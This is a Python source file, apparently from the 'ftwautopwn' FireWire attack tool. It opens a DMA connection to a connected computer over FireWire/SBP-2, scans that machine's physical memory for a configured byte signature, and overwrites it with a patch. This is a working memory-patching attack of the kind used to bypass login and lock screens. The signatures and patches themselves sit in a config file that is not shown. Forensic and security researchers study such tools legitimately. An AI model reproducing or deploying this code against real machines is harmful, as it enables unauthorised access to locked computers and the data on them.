'''
Created on Jun 23, 2011

@author: carmaa
'''
from forensic1394 import Bus
from binascii import unhexlify, hexlify
from time import sleep
from ftwautopwn.util import print_msg
from ftwautopwn.context import Context
import sys

ctx = Context()

def run(context):
    global ctx
    ctx = context
    config = ctx.get_config()
    encoding = ctx.get_encoding()
    list_targets(config)
    selected_target = select_target(config)
    
    # Parse the command line arguments
    sig = unhexlify(bytes(config.get(selected_target, 'signature'), encoding))
    patch = unhexlify(bytes(config.get(selected_target, 'patch'), encoding))
    off = int(config.get(selected_target, 'pageoffset'))
    print_msg('+', 'You have selected: ' + selected_target)
    print_msg('+', 'Using signature: ' + hexlify(sig).decode(encoding))
    print_msg('+', 'Using patch: ' + hexlify(patch).decode(encoding))
    print_msg('+', 'Using offset: ' + str(off))
    
    d = None
    d = initialize_fw(d)
    
    try:
        # Find
        addr = findsig(d, sig, off)
        print()
        print_msg('+', 'Signature found at %d.' % addr)
        # Patch and verify
        d.write(addr, patch)
        assert d.read(addr, len(patch)) == patch
    except IOError:
        print('-', 'Signature not found.')


def list_targets(config):
    print_msg('+', 'Available targets:')
    i = 1
    for target in config.sections():
        print_msg(str(i), target)
        if ctx.get_verbose(): print('\t' + config.get(target, 'notes'))
        i += 1


def select_target(config):
    selected = input('Please select target: ')
    nof_targets = len(config.sections())
    try:
        selected = int(selected)
    except:
        if selected == 'q': sys.exit()
        else:
            print_msg('!', 'Invalid selection, please try again. Type \'q\' ' \
                      'to quit.')
            return select_target(config)
    if selected <= nof_targets: return list(config)[selected]
    else:
        print_msg('!', 'Please enter a selection between 1 and ' + \
                  str(nof_targets) +'. Type \'q\' to quit.')
        return select_target(config)



def initialize_fw(d):
    b = Bus()
    # Enable SBP-2 support to ensure we get DMA
    b.enable_sbp2()
    for i in range(ctx.get_fw_delay(), 0, -1):
        sys.stdout.write('[+] Initializing bus and enabling SBP2, please wait' \
                         ' %2d seconds\r' % i)
        sys.stdout.flush()
        sleep(1)
    # Open the first device
    d = b.devices()[0]
    d.open()
    print()
    print_msg('+', 'Done, attacking!\n')
    return d

def findsig(d, sig, off):
    # Skip the first 1 MiB of memory
    addr = 1 * 1024 * 1024 + off
    while True:
        # Prepare a batch of 128 requests
        r = [(addr + ctx.PAGESIZE * i, len(sig)) for i in range(0, 128)]
        for caddr, cand  in d.readv(r):
            if cand == sig: return caddr
        mibaddr = addr/(1024*1024)
        sys.stdout.write('[+] Searching for signature, %4d MiB so far...\r' % \
                         mibaddr)
        sys.stdout.flush()
        addr += ctx.PAGESIZE * 128  